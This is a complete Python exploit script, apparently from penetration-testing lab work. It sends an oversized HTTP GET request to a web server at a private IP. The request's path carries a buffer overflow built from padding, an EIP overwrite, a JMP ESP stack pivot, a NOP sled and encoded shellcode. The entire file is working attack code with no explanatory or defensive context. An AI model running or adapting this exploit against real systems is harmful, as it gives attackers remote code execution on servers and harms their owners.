#!/usr/bin/python
import socket, sys

# ppr address 0x004313ad
host = "192.168.99.10"
port = 80
# bad characters are 0x09 0x0a 0x0d 0x20
# shellcode start 0202be8d
def send_exploit_request():
    shellcode =  b""
    shellcode += b"\xba\xa8\xa8\x2a\x9e\xd9\xc4\xd9\x74\x24\xf4"
    shellcode += b"\x58\x29\xc9\xb1\x59\x31\x50\x14\x03\x50\x14"
    shellcode += b"\x83\xe8\xfc\x4a\x5d\xd6\x76\x05\x9e\x27\x87"
    shellcode += b"\x79\x16\xc2\xb6\xab\x4c\x86\xeb\x7b\x06\xca"
    shellcode += b"\x07\xf0\x4a\xff\x9c\x74\x43\xf0\x15\x32\xb5"
    shellcode += b"\x3f\xa5\xf3\x79\x93\x65\x92\x05\xee\xb9\x74"
    shellcode += b"\x37\x21\xcc\x75\x70\xf7\xba\x9a\x2c\x5f\xce"
    shellcode += b"\x36\xc1\xd4\x92\x8a\xe0\x3a\x99\xb2\x9a\x3f"
    shellcode += b"\x5e\x46\x17\x41\x8f\x2d\xff\x61\x7f\xba\x48"
    shellcode += b"\x7a\x7e\x6f\xcd\xb3\xf4\xb3\xff\xbc\xbc\x40"
    shellcode += b"\xcb\xc9\x3e\x80\x05\x0e\x81\xe3\x6b\x22\x03"
    shellcode += b"\x3c\x4b\xda\x71\x36\xaf\x67\x82\x8d\xcd\xb3"
    shellcode += b"\x07\x11\x75\x37\xbf\xf5\x87\x94\x26\x7e\x8b"
    shellcode += b"\x51\x2c\xd8\x88\x64\xe1\x53\xb4\xed\x04\xb3"
    shellcode += b"\x3c\xb5\x22\x17\x64\x6d\x4a\x0e\xc0\xc0\x73"
    shellcode += b"\x50\xac\xbd\xd1\x1b\x5f\xab\x66\xe4\x9f\xd4"
    shellcode += b"\x3a\x72\x53\x19\xc5\x82\xfb\x2a\xb6\xb0\xa4"
    shellcode += b"\x80\x50\xf8\x2d\x0f\xa6\x89\x3a\xb0\x78\x31"
    shellcode += b"\x2a\x4e\x79\x41\x62\x95\x2d\x11\x1c\x3c\x4e"
    shellcode += b"\xfa\xdc\xc1\x9b\x96\xd6\x55\xe4\xce\xd6\xc6"
    shellcode += b"\x8c\x0c\x19\x08\xf6\x99\xff\x5a\x58\xc9\xaf"
    shellcode += b"\x1a\x08\xa9\x1f\xf3\x42\x26\x7f\xe3\x6c\xed"
    shellcode += b"\xe8\x8e\x82\x5b\x40\x27\x3a\xc6\x1a\xd6\xc3"
    shellcode += b"\xdd\x66\xd8\x48\xd7\x97\x97\xb8\x92\x8b\xc0"
    shellcode += b"\xde\x5c\x54\x11\x4b\x5c\x3e\x15\xdd\x0b\xd6"
    shellcode += b"\x17\x38\x7b\x79\xe7\x6f\xf8\x7e\x17\xee\xc8"
    shellcode += b"\xf5\x2e\x64\x74\x62\x4f\x68\x74\x72\x19\xe2"
    shellcode += b"\x74\x1a\xfd\x56\x27\x3f\x02\x43\x54\xec\x97"
    shellcode += b"\x6c\x0c\x40\x3f\x05\xb2\xbf\x77\x8a\x4d\xea"
    shellcode += b"\x0b\xcd\xb1\x68\x24\x76\xd9\x92\x74\x86\x19"
    shellcode += b"\xf9\x74\xd6\x71\xf6\x5b\xd9\xb1\xf7\x71\xb2"
    shellcode += b"\xd9\x72\x14\x70\x78\x82\x3d\xd4\x24\x83\xb2"
    shellcode += b"\xcd\xd7\xfe\xbb\xf2\x18\xff\xd5\x96\x19\xff"
    shellcode += b"\xd9\xa8\x26\x29\xe0\xde\x69\xe9\x57\xd0\xdc"
    shellcode += b"\x4c\xf1\x7b\x1e\xc2\x01\xae"
    offset = ""
    offset  += b"A" * (2495 -len(offset))
    offset += b"\x90\xeb\x05\x90"
    offset += b"\xc0\x76\x15\x10" # Controlling EIP
    # JMP ESP, 0x5d7 - 6681C45A36
    # PPR 0x101576c0
    # short jump eb06
    offset += b"\x66\x81\xC4\x5A\x36"
    offset += b"\xFF\xE4"
    offset += b"\x90" * 600
    offset += shellcode
    offset += b"D" * (6000 - len(offset))
    offset += b"\x90" * 6
    offset += b"E" * 400
    buffer = offset
    #HTTP Request
    request = "GET /" + buffer + "HTTP/1.1" + "\r\n"
    request += "Host: " + host + "\r\n"
    request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
    request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
    request += "Accept-Encoding: gzip, deflate" + "\r\n"
    request += "Connection: keep-alive" + "\r\n\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 
    send_exploit_request()